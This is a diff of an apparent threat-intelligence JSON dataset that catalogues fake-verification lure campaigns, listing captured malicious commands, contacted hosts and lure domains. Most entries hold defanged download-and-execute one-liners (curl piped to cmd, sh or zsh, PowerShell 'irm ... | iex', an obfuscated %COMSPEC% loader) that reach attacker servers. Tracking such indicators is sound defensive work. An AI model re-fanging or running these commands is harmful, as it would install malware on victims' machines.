-    "cmd.exe /c \"curl.exe -sL -d \"\"id=2b8b4937-a816-4314-8c64-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsmartgadgetsrus.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A31%3A05.625Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A31%3A05.625Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=b476392d-591f-4a9c-a6b2-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsmartgadgetsrus.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A51.579Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A51.579Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=1f629f50-708c-44af-9602-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fsmartgadgetsrus.com%2F&os=Mac%2015&lastVisitAt=2026-11-07T10%3A54%3A50.192Z&lastShellAt=2026-11-07T10%3A54%3A50.192Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=2239f788-4606-49da-8a17-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsmartgadgetsrus.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T10%3A39%3A31.527Z\"\" -d \"\"lastShellAt=2026-11-07T10%3A39%3A31.527Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
     "ncheck-brows.beer",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -225595,11 +225549,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -225955,14 +225910,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "trustchecknes.com",
     "xorados.com",
     "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com",
     "ncheck-brows.beer"
    ],
    "lure_from": [
@@ -231662,14 +231618,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -239816,12 +239773,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "trustchecknes.com",
-    "trek-72.com"
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -243637,11 +243596,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "t-trustresnew.com",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -244049,18 +244009,20 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -244898,14 +244860,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -248969,6 +248932,7 @@
     "thu-ipad-03.cfd",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "pakistanskimalchik.org"
    ]
   },
@@ -254613,9 +254577,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'szy9d2ro[.]apartmentbusinessplan[.]com/?ublib=29f71d69-45d9-44a2-b814-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/rytu08-74/1babf4c6-aa6d-4ee5-a51e-[id]/-/raw/main/801f2c1e-3bdb-421e-89d0-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/[id] | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "szy9d2ro.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -255080,6 +255048,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/rytu08-74/1babf4c6-aa6d-4ee5-a51e-[id]/-/raw/main/801f2c1e-3bdb-421e-89d0-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/[id] | IEX"
    ],
    "connects_to": [],
@@ -257184,7 +257153,8 @@
    ],
    "lure_from": [
     "ncheck-brows.beer",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -257836,6 +257806,7 @@
     "interseq.at",
     "nikogdatakonebilo.cc",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "efreitorher.org",
     "ktoktotam.cc"
    ]
@@ -259092,17 +259063,19 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
-    "interseq.at"
+    "interseq.at",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -261407,13 +261380,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "%COMSPEC% /c %COMSPEC% /c %COMSPEC% /c start \"\" /^min for /f \"delims=\" %h in ('where ,f*n*er,') do for /f \"delims=\" %q in ('\"%h\" [email]') do @%q & --------------P_u_s_h----t_h_e----_E_n_t_e_r_------"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com",
     "id-dns.net"
    ],
    "lure_from": [
